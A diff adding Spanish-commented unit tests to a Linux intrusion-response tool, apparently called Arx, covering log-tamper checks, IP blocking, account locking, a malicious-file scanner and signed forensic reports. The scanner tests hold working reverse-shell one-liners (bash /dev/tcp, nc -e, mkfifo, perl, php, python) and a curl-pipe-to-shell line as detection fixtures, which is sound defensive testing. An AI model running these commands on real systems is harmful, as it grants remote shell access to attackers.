@@ -777,7 +777,8 @@ class AuthLogTests(unittest.TestCase):
     def test_rotation_is_not_tamper(self):
         open(self.log, "w").write("x" * 500 + "\n")
         self.s.read_auth_log()
-        os.unlink(self.log)  # logrotate: inode NUEVO, no truncado
+        # como logrotate: renombra y crea otro. Con unlink el kernel puede reutilizar el inode.
+        os.rename(self.log, self.log + ".1")
         open(self.log, "w").write("nuevo\n")
         ev = self.s.read_auth_log()
         self.assertEqual([e for e in ev if e["kind"] == "log_tamper"], [])
@@ -1039,6 +1040,27 @@ class TarpitActuatorTests(unittest.TestCase):
     def _scan(self, ip):
         return {"kind": "port_scan", "sev": "high", "detail": f"escaneo desde {ip}",
                 "target": {"ip": ip}}
+
+    def test_bruteforce_is_still_blocked_in_tarpit_mode(self):
+        """Medido: 2 conexiones/s apenas frenan una fuerza bruta SSH. Se sigue bloqueando."""
+        f = {"kind": "auth_bruteforce", "sev": "high", "detail": "fallos desde 203.0.113.7",
+             "target": {"ip": "203.0.113.7"}}
+        self.r.handle(f, enforce=True, cfg=self.tarpit)
+        self.assertTrue(any("add element inet arx block_ipv4 { 203.0.113.7" in c for c in self._flat()))
+        self.assertFalse(any("add element inet arx tarpit4" in c for c in self._flat()))
+
+    def test_rule_that_could_not_be_created_is_not_contained(self):
+        """Sin su regla, meter la IP en el set no estrangula nada: no se puede decir que sí."""
+        class Bad:
+            returncode, stderr, stdout = 1, "meter no soportado", ""
+        good = self.r.subprocess.run
+
+        def run(argv, **kw):
+            return Bad() if "rule" in argv else good(argv, **kw)
+        self._patch(self.r.subprocess, "run", run)
+        o = self.r.handle(self._scan("203.0.113.7"), enforce=True, cfg=self.tarpit)
+        self.assertIn("no se pudo preparar", o["status"])
+        self.assertEqual(self.r._load_blocks(), [])
 
     def test_tarpit_mode_throttles_not_blocks(self):
         o = self.r.handle(self._scan("203.0.113.7"), enforce=True, cfg=self.tarpit)
@@ -1487,6 +1509,7 @@ class IdentityActuatorTests(unittest.TestCase):
             self.calls.append(argv)
             return R()
         self._patch(response, "_is_linux_root", lambda: True)
+        self._patch(response, "_shadow_state", lambda u: (False, ""))
         self._patch(response.shutil, "which", lambda c: f"/usr/sbin/{c}")
         self._patch(response.subprocess, "run", fake_run)
 
@@ -1515,9 +1538,63 @@ class IdentityActuatorTests(unittest.TestCase):
         self._pwuid(1001)
         res = self.r._execute_tier2(self._login("mallory@198.51.100.9"))
         self.assertIn("bloqueada", res)
-        self.assertTrue(any("usermod -L mallory" in c for c in self._flat()))
+        # -L solo bloquea la contraseña: sin -e 1, una llave SSH sigue entrando (probado en real)
+        self.assertTrue(any("usermod -L -e 1 mallory" in c for c in self._flat()))
         self.assertEqual(self.r._load_blocks()[0]["revert"],
-                         {"tool": "usermod", "user": "mallory", "uid": 1001})
+                         {"tool": "usermod", "user": "mallory", "uid": 1001,
+                          "was_locked": False, "expire": ""})
+
+    def test_says_that_open_sessions_stay_open(self):
+        self._pwuid(1001)
+        self.assertIn("NO se cierran", self.r._execute_tier2(self._login("mallory")))
+
+    def test_account_locked_by_admin_stays_locked_after_expiry(self):
+        """Arx no puede desbloquear al expirar lo que un humano ya había bloqueado."""
+        self._pwuid(1001)
+        self._patch(self.r, "_shadow_state", lambda u: (True, ""))
+        self.r._execute_tier2(self._login("carol"))
+        self.calls.clear()
+        self.r.expire_blocks(now=datetime.now(timezone.utc) + timedelta(minutes=61))
+        self.assertEqual(self.calls, [["usermod", "-e", "", "carol"]])  # sin -U
+
+    def test_previous_expiry_date_is_restored(self):
+        self._pwuid(1001)
+        self._patch(self.r, "_shadow_state", lambda u: (False, "21000"))
+        self.r._execute_tier2(self._login("carol"))
+        self.calls.clear()
+        self.r.expire_blocks(now=datetime.now(timezone.utc) + timedelta(minutes=61))
+        self.assertEqual(self.calls, [["usermod", "-U", "-e", "21000", "carol"]])
+
+    def test_unreadable_state_does_not_lock(self):
+        self._pwuid(1001)
+        self._patch(self.r, "_shadow_state", lambda u: None)
+        self.assertIn("no se bloquea", self.r._execute_tier2(self._login("carol")))
+        self.assertEqual(self.calls, [])
+
+    def test_failed_restore_is_not_reported_as_done(self):
+        class Bad:
+            returncode, stderr, stdout = 1, "passwordless account", ""
+        self._pwuid(1001)
+        self._patch(self.r.subprocess, "run", lambda argv, **kw: Bad())
+        out = self.r._apply_revert({"tool": "usermod", "user": "dan", "uid": 1001, "expire": ""})
+        self.assertIn("no se pudo", out)
+
+    def test_malformed_revert_rejected(self):
+        for bad in ({"tool": "usermod", "user": "dan\n", "uid": 1},
+                    {"tool": "usermod", "user": "dan", "uid": 1, "expire": "-Z"},
+                    {"tool": "usermod", "user": "dan", "uid": "1"}):
+            self.assertIsNone(self.r._apply_revert(bad), bad)
+        self.assertEqual(self.calls, [])
+
+    def test_authorized_action_is_not_requested_again_while_active(self):
+        """La sesión sigue abierta, así que el hallazgo reaparece: no debe re-pedirse."""
+        self._pwuid(1001)
+        f = self._login("intruso@203.0.113.9")
+        item = self.r.authorize_pending(self.r.handle(f, cfg={})["pending_id"])
+        self.assertIn("bloqueada", item["executed"])
+        again = self.r.handle(f, cfg={})
+        self.assertIn("ya autorizado", again["status"])
+        self.assertEqual(self.r.list_pending(), [])
 
     def test_never_locks_root_or_system(self):
         self._pwuid(0)
@@ -1547,7 +1624,7 @@ class IdentityActuatorTests(unittest.TestCase):
         later = datetime.now(timezone.utc) + timedelta(minutes=61)
         # mismo uid → desbloquea
         self.r.expire_blocks(now=later)
-        self.assertIn("usermod -U mallory", self._flat()[-1])
+        self.assertEqual(self.calls[-1], ["usermod", "-U", "-e", "", "mallory"])
 
     def test_expiry_does_not_unlock_recreated_account(self):
         self._pwuid(1001)
@@ -1565,7 +1642,7 @@ class IdentityActuatorTests(unittest.TestCase):
         self.assertEqual(o["tier"], 2)
         item = self.r.authorize_pending(o["pending_id"])
         self.assertIn("bloqueada", item["executed"])
-        self.assertTrue(any("usermod -L intruso" in c for c in self._flat()))
+        self.assertTrue(any("usermod -L -e 1 intruso" in c for c in self._flat()))
 
 
 class SandboxTests(unittest.TestCase):
@@ -1635,6 +1712,121 @@ class SandboxTests(unittest.TestCase):
         self.assertIn("sandbox:", out["detail"])
         self.assertEqual(out["sandbox"]["verdict"], "malicioso")
 
+    def test_hostile_file_cannot_hang_the_analysis(self):
+        """Antes, 128 KB colgaban el bucle de guardia (backtracking cuadrático en una regex)."""
+        import time
+        for name, body in {"nc": b"nc -" + b"e" * (5 * 1024 * 1024),
+                           "tokens": b"nc " * (1024 * 1024),
+                           "socket": b"socket.socket " * (300 * 1024),
+                           "mkfifo": b"mkfifo " * (700 * 1024)}.items():
+            t = time.monotonic()
+            rep = self.s.analyze(self._file(body, name), budget=self.s.ENRICH_BUDGET_S)
+            self.assertLess(time.monotonic() - t, 20, name)  # margen amplio: CI es lento
+            self.assertIn(rep["verdict"], ("limpio", "sospechoso"), name)
+
+    def test_budget_interrupts_a_regex_and_is_never_clean(self):
+        """Red de seguridad para cualquier regla futura: lo que no termina no es 'limpio'."""
+        import time
+        evil = [{"name": "evil", "sev": "sospechoso", "type": "regex", "pattern": r"(a+)+$",
+                 "why": "x"}]
+        with mock.patch.object(self.s, "RULES", evil):
+            t = time.monotonic()
+            rep = self.s.analyze(self._file(b"a" * 64 + b"!", "trap"), budget=0.2)
+        self.assertLess(time.monotonic() - t, 3)
+        self.assertEqual(rep["verdict"], "sospechoso")
+        self.assertEqual(rep["hits"][0]["rule"], "analysis-budget")
+
+    def test_fifo_does_not_block(self):
+        """Antes colgaba: abrir un FIFO sin escritor se bloquea para siempre."""
+        path = os.path.join(self.d, "fifo")
+        os.mkfifo(path)
+        rep = self.s.analyze(path, budget=2)
+        self.assertEqual(rep["verdict"], "desconocido")
+        self.assertIn("no es un fichero regular", rep["reasons"][0])
+
+    def test_sha256_is_of_the_whole_file(self):
+        import hashlib
+        data = os.urandom(6 * 1024 * 1024)
+        self.assertEqual(self.s.analyze(self._file(data, "big"))["sha256"],
+                         hashlib.sha256(data).hexdigest())
+
+    def test_payload_after_padding_is_seen(self):
+        data = b"\x00" * (6 * 1024 * 1024) + b"\nbash -i >& /dev/tcp/10.0.0.3/4444 0>&1\n"
+        self.assertEqual(self.s.analyze(self._file(data, "pad"))["verdict"], "malicioso")
+
+    def test_unread_middle_of_a_large_file_is_not_clean(self):
+        data = b"\x00" * (9 * 1024 * 1024)
+        rep = self.s.analyze(self._file(data, "large"))
+        self.assertTrue(rep["truncated"])
+        self.assertEqual(rep["verdict"], "desconocido")
+
+    def test_reverse_shell_variants_are_recognized(self):
+        for name, body in {
+            "variables": "bash -i >& /dev/tcp/$LHOST/$LPORT 0>&1",
+            "nc -c": "nc 10.0.0.3 4444 -c /bin/bash",
+            "ncat --exec": "ncat 10.0.0.3 4444 --exec /bin/bash",
+            "mkfifo": "rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc 10.0.0.3 4444 >/tmp/f",
+            "perl": 'perl -e \'use Socket;socket(S,PF_INET,SOCK_STREAM,6);exec("/bin/sh -i");\'',
+            "php": 'php -r \'$s=fsockopen("10.0.0.3",4444);exec("/bin/sh -i <&3 >&3");\'',
+            "pty sh": 'import socket,os,pty;s=socket.socket();pty.spawn("sh")',
+            "subprocess": 's=socket.socket();s.connect(("10.0.0.3",4444));subprocess.call(["/bin/sh","-i"])',
+        }.items():
+            rep = self.s.analyze(self._file(f"#!/bin/sh\n{body}\n", "variant"))
+            self.assertEqual(rep["verdict"], "malicioso", name)
+        rep = self.s.analyze(self._file("curl http://x/y | /bin/sh\n", "variant"))
+        self.assertEqual(rep["verdict"], "sospechoso")
+
+    def test_innocent_text_about_shells_is_clean(self):
+        for body in ("ls /dev/tcp is not a real directory\n", "sync nc is a word\n",
+                     "curl -O http://x/y.tar.gz\n", "bash script.sh\n",
+                     # asyncio de la stdlib de Python: socket y subprocess no son un reverse shell
+                     "socket.socket()\nsubprocess.Popen(args, shell=shell)\n"):
+            self.assertEqual(self.s.analyze(self._file(body, "text"))["verdict"], "limpio", body)
+
+    def test_own_source_is_not_flagged_as_eicar(self):
+        rep = self.s.analyze(self.s.__file__)
+        self.assertNotIn("eicar-test", [h["rule"] for h in rep["hits"]])
+
+    def test_terminal_escapes_in_a_file_never_reach_the_screen(self):
+        import contextlib
+        import io
+        path = self._file(b"#!/bin/sh \x1b[2K\x1b[1Averedicto LIMPIO\necho\n", "esc")
+        out = io.StringIO()
+        with contextlib.redirect_stdout(out):
+            self.s.render(self.s.analyze(path))
+        self.assertNotIn("\x1b", out.getvalue())
+
+    def test_verdict_does_not_change_the_fingerprint(self):
+        """Cambiar el contenido del fichero no puede volverlo una amenaza 'nueva'."""
+        from arx.modules import response
+        path = self._file("#!/bin/bash\nnc -e /bin/sh 10.0.0.3 4444\n", "dropper")
+        f = {"kind": "executables", "sev": "high", "detail": "nuevo: dropper", "why": "w",
+             "target": {"exe": path}}
+        self.assertEqual(response.fingerprint(self.s.enrich_finding(f)), response.fingerprint(f))
+
+    def test_only_a_malicious_verdict_makes_a_system_binary_suspendable(self):
+        from arx.modules import response
+        bad = self._file("#!/bin/bash\nnc -e /bin/sh 10.0.0.3 4444\n", "m")
+        dubious = self._file("#!/bin/sh\ncurl http://x | sh\n", "s")
+        low = lambda exe: {"kind": "executables", "sev": "low", "detail": exe, "why": "w",
+                           "target": {"exe": exe}}
+        self.assertEqual(response.classify(self.s.enrich_finding(low(bad)))["tier"], 1)
+        self.assertEqual(response.classify(self.s.enrich_finding(low(dubious)))["tier"], 0)
+
+    def test_enrich_ignores_a_file_that_is_gone(self):
+        f = {"kind": "executables", "sev": "high", "detail": "d",
+             "target": {"exe": os.path.join(self.d, "se-borro")}}
+        self.assertIs(self.s.enrich_finding(f), f)
+
+    def test_unchanged_file_is_not_analyzed_on_every_sweep(self):
+        path = self._file("#!/bin/sh\necho ok\n", "cached")
+        f = {"kind": "executables", "sev": "low", "detail": "d", "target": {"exe": path}}
+        self.s._CACHE.clear()
+        with mock.patch.object(self.s, "analyze", wraps=self.s.analyze) as spy:
+            self.s.enrich_finding(f)
+            self.s.enrich_finding(f)
+        self.assertEqual(spy.call_count, 1)
+
     def test_enrich_leaves_clean_and_non_exe_untouched(self):
         clean = {"kind": "executables", "sev": "low", "detail": "d",
                  "target": {"exe": self._file("#!/bin/sh\necho ok\n", "clean")}}
@@ -1696,11 +1888,168 @@ class ForensicsTests(unittest.TestCase):
         self.assertFalse(ok)
         self.assertIn("otra clave", msg)
 
+    def test_recomputed_chain_is_caught_by_the_hmac(self):
+        """La cadena sola no protege: quien altera puede recalcularla. Lo detecta el HMAC."""
+        self._seed()
+        rep = self.f.build_report()
+        rep["cronologia"][0]["detail"] = "nada que ver aquí"
+        rep["firma"]["chain"] = self.f._chain(rep["cronologia"])
+        ok, msg = self.f.verify(rep)
+        self.assertFalse(ok)
+        self.assertIn("HMAC", msg)
+
+    def test_observe_mode_is_not_reported_as_actions_taken(self):
+        """Un informe forense no puede decir que se actuó si solo se propuso."""
+        self._seed()  # Tier 1 y Tier 2 sin ejecutar nada
+        self.assertEqual(self.f.build_report()["resumen"]["acciones_tomadas"], 0)
+        self.r.record({"kind": "incident", "tier": 1, "detail": "x", "status": "bloqueada",
+                       "revert": {"tool": "nft_ip", "ip": "203.0.113.7"}})
+        self.r.record({"kind": "tier2_executed", "detail": "y", "result": "restaurado"})
+        self.assertEqual(self.f.build_report()["resumen"]["acciones_tomadas"], 2)
+
+    def test_malformed_report_never_raises(self):
+        self._seed()
+        good = self.f.build_report()
+        for bad in ({"firma": []}, {"firma": {}}, {},
+                    {**good, "firma": {**good["firma"], "hmac": 5}},
+                    {**good, "firma": {**good["firma"], "hmac": "á"}},
+                    {**good, "cronologia": "x"}):
+            ok, _ = self.f.verify(bad)
+            self.assertFalse(ok, bad.get("firma"))
+
+    def test_verify_does_not_create_a_key(self):
+        from arx import config
+        self._seed()
+        rep = self.f.build_report()
+        sec = config.load_secrets()
+        sec.pop("forensic_hmac_key")
+        config.save_secrets(sec)
+        ok, msg = self.f.verify(rep)
+        self.assertFalse(ok)
+        self.assertIn("no tiene la clave", msg)
+        self.assertNotIn("forensic_hmac_key", config.load_secrets())
+
+    def test_known_secrets_are_redacted_before_sealing(self):
+        from arx import config
+        config.save_secrets({"openai": "clave-super-secreta-123"})
+        self.r.record({"kind": "incident", "sev": "high", "tier": 0,
+                       "detail": "argv: curl -H 'Authorization: clave-super-secreta-123'"})
+        rep = self.f.build_report()
+        self.assertNotIn("clave-super-secreta-123", str(rep["cronologia"]))
+        self.assertTrue(self.f.verify(rep)[0])
+
+    def test_report_survives_json_roundtrip_with_hostile_text(self):
+        import json
+        self.r.record({"kind": "incident", "tier": 0, "detail": "ruta \udcff\x1b[2K\nfalsa"})
+        rep = json.loads(json.dumps(self.f.build_report()))
+        self.assertTrue(self.f.verify(rep)[0])
+
     def test_since_filters_and_empty_is_signed(self):
         rep = self.f.build_report(since="2999-01-01T00:00:00+00:00")  # futuro → vacío
         self.assertEqual(rep["cronologia"], [])
         ok, _ = self.f.verify(rep)           # un informe vacío también va sellado y verifica
         self.assertTrue(ok)
+
+
+class PackagingTests(unittest.TestCase):
+    """Lo que se instala no es `python -m arx.cli`: el lab y los tests no lo veían."""
+
+    def test_packaged_cli_propagates_the_exit_code(self):
+        """Antes, zipapp -m arx.cli:main ignoraba el retorno: `arx` siempre salía con 0."""
+        import subprocess
+        d = _isolate()
+        root = os.path.join(os.path.dirname(__file__), "..")
+        pyz = os.path.join(d, "arx.pyz")
+        subprocess.run([sys.executable, "-m", "zipapp", os.path.join(root, "src"),
+                        "-m", "arx.cli:entry", "-o", pyz], check=True)
+        bad = os.path.join(d, "x.sh")
+        with open(bad, "w") as f:
+            f.write("bash -i >& /dev/tcp/10.0.0.3/4444 0>&1\n")
+        r = subprocess.run([sys.executable, pyz, "scan", bad], capture_output=True, text=True)
+        self.assertEqual(r.returncode, 1, r.stderr)
+
+    def test_every_build_uses_the_entry_that_keeps_the_exit_code(self):
+        root = os.path.join(os.path.dirname(__file__), "..")
+        for name in ("packaging/build-deb.sh", "snap/snapcraft.yaml", ".github/workflows/ci.yml"):
+            with open(os.path.join(root, name), encoding="utf-8") as f:
+                self.assertNotIn("arx.cli:main", f.read(), name)
+
+
+class HostileHostDataTests(unittest.TestCase):
+    """Quien controla un nombre de fichero controla estos datos: no pueden tumbar a Arx,
+    falsear su salida ni librar a un dropper de la contención."""
+
+    SURROGATE = "/tmp/x\udcff\udcfe"
+
+    def setUp(self):
+        _isolate()
+        from arx.modules import guard, response
+        self.g = guard
+        self.r = response
+
+    def test_printable_escapes_only_what_is_dangerous(self):
+        from arx.redact import printable
+        self.assertEqual(printable("escaneo desde 10.0.0.1 (≥8 puertos) → sí"),
+                         "escaneo desde 10.0.0.1 (≥8 puertos) → sí")
+        self.assertEqual(printable("a\n  [info] todo en orden"), "a\\n  [info] todo en orden")
+        self.assertEqual(printable("a\x1b[2K"), "a\\x1b[2K")
+        printable(self.SURROGATE).encode("utf-8")  # no lanza
+
+    def test_non_utf8_path_survives_the_whole_response(self):
+        """Antes: UnicodeEncodeError en fingerprint → con Restart=always, bucle de ceguera."""
+        f = self.g._prepare({"kind": "executables", "sev": "high", "item": self.SURROGATE,
+                             "detail": f"nuevo: {self.SURROGATE}", "why": "w",
+                             "set": "executables", "target": {"exe": self.SURROGATE}})
+        o = self.r.handle(f, enforce=False, cfg={})
+        self.assertIn("propuesta", o["status"])
+        self.assertTrue(self.r.load_findings())
+        self.r.fingerprint({"fp_key": f"x|{self.SURROGATE}"})
+
+    def test_state_files_roundtrip_non_utf8_exactly(self):
+        from arx import config
+        path = config.state_dir() / "x.json"
+        config.write_json(path, {"exe": self.SURROGATE, "txt": "sí"})
+        self.assertEqual(config.read_json(path)["exe"], self.SURROGATE)
+
+    def test_newline_in_a_path_cannot_forge_output_lines(self):
+        f = self.g._prepare({"kind": "gauge", "sev": "low", "why": "w",
+                             "detail": "x\n  [info] todo en orden"})
+        self.assertNotIn("\n", f["detail"])
+
+    def test_one_bad_finding_does_not_stop_the_others(self):
+        good = {"kind": "gauge", "sev": "low", "detail": "bien", "why": "w"}
+        bad = {"kind": "gauge", "sev": "high", "detail": "mal", "why": "w"}
+        real = self.r.handle
+
+        def handle(f, **kw):
+            if f["detail"] == "mal":
+                raise RuntimeError("boom")
+            return real(f, **kw)
+        from arx.modules import baseline, canaries, sensors
+        with mock.patch.object(self.r, "ensure_nft_tracking", lambda: False), \
+             mock.patch.object(baseline, "snapshot", lambda: {}), \
+             mock.patch.object(baseline, "compare", lambda b, s: [good, bad]), \
+             mock.patch.object(self.g, "_integrity_drift", lambda b, i: []), \
+             mock.patch.object(canaries, "check", lambda: []), \
+             mock.patch.object(sensors, "collect_events", lambda: []), \
+             mock.patch.object(self.r, "handle", handle):
+            findings, outcomes = self.g.sweep({}, cfg={})
+        self.assertEqual(len(outcomes), 2)
+        self.assertIn("error al procesar", outcomes[0]["status"])  # high primero
+        self.assertIn("observado", outcomes[1]["status"])
+
+    def test_analysis_cannot_delay_the_response(self):
+        """Agotado el tope del barrido se responde sin veredicto, no se espera al análisis."""
+        f = {"kind": "executables", "sev": "high", "detail": "d", "why": "w",
+             "target": {"exe": "/tmp/x"}}
+        with mock.patch("arx.modules.sandbox.enrich_finding", side_effect=AssertionError):
+            self.assertEqual(self.g._prepare(f, enrich=False)["detail"], "d")
+
+    def test_self_deleted_dropper_is_still_found(self):
+        """Antes: `rm` tras ejecutarse bastaba para esquivar la suspensión."""
+        with mock.patch.object(self.r.os, "listdir", lambda p: ["4242", "self"]), \
+             mock.patch.object(self.r.os, "readlink", lambda p: "/tmp/miner (deleted)"):
+            self.assertEqual(self.r._pids_for_exe("/tmp/miner"), [4242])
 
 
 if __name__ == "__main__":
